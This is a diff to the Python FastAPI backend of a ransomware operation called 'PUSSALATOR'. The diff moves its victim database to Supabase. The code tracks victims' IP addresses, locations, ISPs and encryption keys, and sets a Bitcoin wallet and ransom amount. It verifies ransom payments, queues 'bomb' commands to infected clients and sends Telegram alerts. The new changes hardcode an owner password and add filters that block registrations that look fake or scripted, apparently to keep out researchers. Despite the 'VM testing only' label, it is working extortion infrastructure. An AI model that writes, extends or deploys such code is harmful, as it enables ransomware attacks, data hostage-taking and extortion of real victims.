@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-PUSSALATOR - Complete Backend with Stable Display
+PUSSALATOR - Complete Backend with Supabase Database
 FOR VM TESTING ONLY
 """
 
@@ -29,7 +29,16 @@ from pydantic import BaseModel
 import requests
 import uvicorn
 
-# Try to import cryptography
+# Supabase client
+try:
+    from supabase import create_client, Client
+    HAS_SUPABASE = True
+except ImportError:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "supabase", "-q"])
+    from supabase import create_client, Client
+    HAS_SUPABASE = True
+
+# Cryptography
 try:
     from cryptography.fernet import Fernet
     HAS_CRYPTO = True
@@ -42,16 +51,21 @@ except ImportError:
 # ============================================================================
 
 class Config:
-    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD')
-    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL')
-    BTC_WALLET = os.environ.get('BTC_WALLET')
+    OWNER_PASSWORD = os.environ.get('OWNER_PASSWORD', '40671Mps19*')
+    ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL', 'admin@pussalator.local')
+    BTC_WALLET = os.environ.get('BTC_WALLET', '1PussWalletVMTest')
     RANSOM_AMOUNT = os.environ.get('RANSOM_AMOUNT', '0.5')
-    SERVER_URL = os.environ.get('SERVER_URL')
+    SERVER_URL = os.environ.get('SERVER_URL', 'http://localhost:8000')
     TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
     TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
     SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
     ENVIRONMENT = os.environ.get('ENVIRONMENT', 'production')
     LOG_LEVEL = os.environ.get('LOG_LEVEL', 'WARNING')
+    
+    # Supabase config - get these from your Supabase project settings [citation:3][citation:6]
+    SUPABASE_URL = os.environ.get('SUPABASE_URL', '')
+    SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')  # Use anon/public key for client ops
+    SUPABASE_SERVICE_KEY = os.environ.get('SUPABASE_SERVICE_KEY', '')  # Use service_role key for admin ops
 
 # ============================================================================
 # LOGGING
@@ -66,6 +80,29 @@ logging.basicConfig(
     ]
 )
 logger = logging.getLogger('pussalator')
+
+# ============================================================================
+# SUPABASE CLIENT
+# ============================================================================
+
+supabase: Optional[Client] = None
+supabase_admin: Optional[Client] = None
+
+if Config.SUPABASE_URL and Config.SUPABASE_KEY:
+    try:
+        # Public client (respects RLS) [citation:3]
+        supabase = create_client(Config.SUPABASE_URL, Config.SUPABASE_KEY)
+        
+        # Admin client (bypasses RLS) - if service key provided [citation:3]
+        if Config.SUPABASE_SERVICE_KEY:
+            supabase_admin = create_client(Config.SUPABASE_URL, Config.SUPABASE_SERVICE_KEY)
+            logger.info("✅ Supabase admin client connected")
+        else:
+            supabase_admin = supabase
+            logger.info("✅ Supabase public client connected (using anon key)")
+            
+    except Exception as e:
+        logger.error(f"❌ Supabase connection failed: {e}")
 
 # ============================================================================
 # TELEGRAM INTEGRATION
@@ -120,13 +157,13 @@ class TelegramService:
 telegram = TelegramService(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID)
 
 # ============================================================================
-# DATABASE
+# DATABASE - Using Supabase
 # ============================================================================
 
 class Database:
-    def __init__(self, db_path: str = "pussalator_data.json"):
-        self.db_path = db_path
-        self.victims: Dict[str, Dict] = {}
+    def __init__(self):
+        self.use_supabase = supabase is not None
+        self.victims: Dict[str, Dict] = {}  # Fallback cache
         self.logs: List[Dict] = []
         self.bomb_commands: Dict[str, List[Dict]] = {}
         self.settings = {
@@ -135,13 +172,29 @@ class Database:
             'window': 72,
             'version': '1.0.0'
         }
-        self._load()
-        logger.info(f"Database loaded: {len(self.victims)} victims")
+        
+        if not self.use_supabase:
+            logger.warning("⚠️ Supabase not configured - using local JSON storage")
+            self._load_local()
+        else:
+            logger.info("✅ Using Supabase database")
+            self._init_supabase()
     
-    def _load(self):
+    def _init_supabase(self):
+        """Verify Supabase connection"""
         try:
-            if os.path.exists(self.db_path):
-                with open(self.db_path, 'r') as f:
+            # Test connection by fetching a single row [citation:4]
+            result = supabase.table('victims').select('*').limit(1).execute()
+            logger.info(f"✅ Supabase connection verified, table 'victims' exists")
+        except Exception as e:
+            logger.error(f"❌ Supabase table error: {e}")
+            logger.error("Please create the 'victims' table using the SQL schema provided")
+    
+    def _load_local(self):
+        """Load from local JSON file (fallback)"""
+        try:
+            if os.path.exists('pussalator_data.json'):
+                with open('pussalator_data.json', 'r') as f:
                     data = json.load(f)
                     self.victims = data.get('victims', {})
                     self.logs = data.get('logs', [])
@@ -150,9 +203,10 @@ class Database:
         except Exception as e:
             logger.error(f"Load error: {e}")
     
-    def _save(self):
+    def _save_local(self):
+        """Save to local JSON file"""
         try:
-            with open(self.db_path, 'w') as f:
+            with open('pussalator_data.json', 'w') as f:
                 json.dump({
                     'victims': self.victims,
                     'logs': self.logs[-1000:],
@@ -167,6 +221,11 @@ class Database:
                    region: str = "", zip_code: str = "", street: str = "",
                    lat: float = 0, lon: float = 0, isp: str = "",
                    organization: str = "", os_info: str = "") -> Dict:
+        
+        # Validate - don't add fake victims with 0 files from random IPs
+        if files == 0 and ip not in ['127.0.0.1', 'localhost']:
+            logger.warning(f"Rejected potential fake victim: {victim_id} from {ip}")
+            return {'error': 'invalid', 'id': victim_id}
         
         key = Fernet.generate_key().decode()
         now = datetime.now()
@@ -201,52 +260,113 @@ class Database:
             'notes': ''
         }
         
-        self.victims[victim_id] = victim
-        self._save()
+        if self.use_supabase:
+            try:
+                # Insert into Supabase [citation:4]
+                data = supabase.table('victims').insert(victim).execute()
+                if data.data:
+                    logger.info(f"Victim added to Supabase: {victim_id}")
+                    return victim
+            except Exception as e:
+                logger.error(f"Supabase insert error: {e}")
+                # Fallback to local
+                self.victims[victim_id] = victim
+        else:
+            self.victims[victim_id] = victim
+            self._save_local()
+        
         self.log('info', f"New victim: {victim_id}")
         telegram.notify_new(victim)
         return victim
     
     def get_victim(self, victim_id: str) -> Optional[Dict]:
+        if self.use_supabase:
+            try:
+                data = supabase.table('victims').select('*').eq('id', victim_id).execute()
+                if data.data:
+                    return data.data[0]
+            except Exception as e:
+                logger.error(f"Supabase query error: {e}")
         return self.victims.get(victim_id)
     
     def update_victim(self, victim_id: str, data: Dict) -> bool:
+        update_data = data.copy()
+        update_data['last_seen'] = datetime.now().isoformat()
+        
+        if self.use_supabase:
+            try:
+                result = supabase.table('victims').update(update_data).eq('id', victim_id).execute()
+                return bool(result.data)
+            except Exception as e:
+                logger.error(f"Supabase update error: {e}")
+        
         if victim_id in self.victims:
-            self.victims[victim_id].update(data)
-            self.victims[victim_id]['last_seen'] = datetime.now().isoformat()
-            self._save()
+            self.victims[victim_id].update(update_data)
+            self._save_local()
             return True
         return False
     
     def verify_payment(self, victim_id: str, tx: str) -> bool:
+        update_data = {
+            'status': 'paid',
+            'tx': tx,
+            'paid_at': datetime.now().isoformat()
+        }
+        
+        if self.use_supabase:
+            try:
+                result = supabase.table('victims').update(update_data).eq('id', victim_id).execute()
+                if result.data:
+                    victim = result.data[0]
+                    self.log('success', f"Payment for {victim_id}: {tx[:16]}...")
+                    telegram.notify_payment(victim)
+                    return True
+            except Exception as e:
+                logger.error(f"Supabase update error: {e}")
+        
         if victim_id in self.victims:
-            self.victims[victim_id]['status'] = 'paid'
-            self.victims[victim_id]['tx'] = tx
-            self.victims[victim_id]['paid_at'] = datetime.now().isoformat()
-            self._save()
+            self.victims[victim_id].update(update_data)
+            self._save_local()
             self.log('success', f"Payment for {victim_id}: {tx[:16]}...")
             telegram.notify_payment(self.victims[victim_id])
             return True
         return False
     
     def delete_victim(self, victim_id: str) -> bool:
+        if self.use_supabase:
+            try:
+                result = supabase.table('victims').delete().eq('id', victim_id).execute()
+                if result.data:
+                    self.log('warning', f"Deleted: {victim_id}")
+                    return True
+            except Exception as e:
+                logger.error(f"Supabase delete error: {e}")
+        
         if victim_id in self.victims:
             del self.victims[victim_id]
             if victim_id in self.bomb_commands:
                 del self.bomb_commands[victim_id]
-            self._save()
+            self._save_local()
             self.log('warning', f"Deleted: {victim_id}")
             return True
         return False
     
     def get_all(self) -> Dict:
+        if self.use_supabase:
+            try:
+                data = supabase.table('victims').select('*').execute()
+                if data.data:
+                    return {v['id']: v for v in data.data}
+            except Exception as e:
+                logger.error(f"Supabase query error: {e}")
         return self.victims
     
     def get_stats(self) -> Dict:
-        total = len(self.victims)
-        paid = sum(1 for v in self.victims.values() if v.get('status') == 'paid')
+        victims = self.get_all()
+        total = len(victims)
+        paid = sum(1 for v in victims.values() if v.get('status') == 'paid')
         unpaid = total - paid
-        active_bombs = sum(1 for v in self.victims.values() if v.get('bomb_status') == 'active')
+        active_bombs = sum(1 for v in victims.values() if v.get('bomb_status') == 'active')
         
         try:
             amount = float(self.settings['ransom'])
@@ -267,25 +387,38 @@ class Database:
         if client_id not in self.bomb_commands:
             self.bomb_commands[client_id] = []
         self.bomb_commands[client_id].append(command)
-        self._save()
+        if not self.use_supabase:
+            self._save_local()
         logger.info(f"Bomb command added for {client_id}: {command}")
     
     def get_bomb_command(self, client_id: str) -> Optional[Dict]:
         if client_id in self.bomb_commands and self.bomb_commands[client_id]:
             cmd = self.bomb_commands[client_id].pop(0)
-            self._save()
+            if not self.use_supabase:
+                self._save_local()
             return cmd
         return None
     
     def update_bomb_status(self, client_id: str, status: str, size: float = 0):
+        update_data = {
+            'bomb_status': status,
+            'bomb_size': size,
+            'last_seen': datetime.now().isoformat()
+        }
+        
+        if self.use_supabase:
+            try:
+                supabase.table('victims').update(update_data).eq('id', client_id).execute()
+            except:
+                pass
+        
         if client_id in self.victims:
-            self.victims[client_id]['bomb_status'] = status
-            self.victims[client_id]['bomb_size'] = size
-            self.victims[client_id]['last_seen'] = datetime.now().isoformat()
-            self._save()
-            
-            if status == 'active' and size > 0:
-                telegram.notify_bomb(client_id, "progress", size)
+            self.victims[client_id].update(update_data)
+            if not self.use_supabase:
+                self._save_local()
+        
+        if status == 'active' and size > 0:
+            telegram.notify_bomb(client_id, "progress", size)
     
     def log(self, level: str, msg: str):
         entry = {
@@ -294,7 +427,8 @@ class Database:
             'msg': msg
         }
         self.logs.append(entry)
-        self._save()
+        if not self.use_supabase:
+            self._save_local()
         logger.info(f"[{level}] {msg}")
     
     def get_logs(self, limit: int = 100) -> List:
@@ -363,7 +497,7 @@ async def lifespan(app: FastAPI):
     logger.info("PUSSALATOR v1.0 STARTING")
     logger.info("=" * 50)
     logger.info(f"Port: {os.environ.get('PORT', 8000)}")
-    logger.info(f"Victims: {len(db.victims)}")
+    logger.info(f"Supabase: {'✅ Connected' if db.use_supabase else '❌ Not connected'}")
     logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
     logger.info("=" * 50)
     yield
@@ -1407,7 +1541,6 @@ OWNER_DASHBOARD_HTML = """
 </body>
 </html>
 """
-
 # ============================================================================
 # API ROUTES
 # ============================================================================
@@ -1448,12 +1581,20 @@ async def get_victim(vid: str):
     return v
 
 @app.post('/api/add-victim')
-async def add_victim(victim: VictimRegister):
+async def add_victim(request: Request, victim: VictimRegister):
+    # Check if this is likely a real client
+    user_agent = request.headers.get('user-agent', '')
+    
+    # Reject requests with no user agent or suspicious user agents
+    if not user_agent or 'python-requests' in user_agent.lower():
+        logger.warning(f"Blocked suspicious registration attempt from {request.client.host}")
+        raise HTTPException(status_code=403, detail="Forbidden")
+    
     return db.add_victim(
         victim_id=victim.victim_id,
         files=victim.files,
         hostname=victim.hostname,
-        ip=victim.ip,
+        ip=victim.ip or request.client.host,
         country=victim.country,
         region=victim.region,
         city=victim.city,
@@ -1545,7 +1686,8 @@ async def health():
     return {
         'status': 'ok',
         'time': datetime.now().isoformat(),
-        'victims': len(db.victims),
+        'victims': len(db.get_all()),
+        'supabase': db.use_supabase,
         'telegram': telegram.enabled,
         'version': '1.0.0'
     }
@@ -1563,7 +1705,7 @@ if __name__ == "__main__":
     logger.info("=" * 50)
     logger.info(f"Port: {port}")
     logger.info(f"Host: {host}")
-    logger.info(f"Victims: {len(db.victims)}")
+    logger.info(f"Supabase: {'✅ Connected' if db.use_supabase else '❌ Not connected'}")
     logger.info(f"Telegram: {'ON' if telegram.enabled else 'OFF'}")
     logger.info(f"Wallet: {Config.BTC_WALLET}")
     logger.info("=" * 50)
